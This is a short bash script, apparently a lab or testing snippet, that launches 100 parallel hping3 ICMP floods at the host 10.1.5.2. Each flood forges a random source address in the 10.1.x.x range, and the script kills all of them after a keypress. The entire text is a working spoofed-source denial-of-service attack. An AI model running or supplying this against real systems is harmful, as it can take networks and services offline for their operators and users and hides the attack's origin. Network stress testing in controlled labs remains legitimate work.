for i in {1..100}; do
  # Generate random IP in 10.1.x.x range
  RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
  sudo hping3 -1 --flood -a $RANDOM_IP 10.1.5.2 &
done
read
sudo pkill hping3
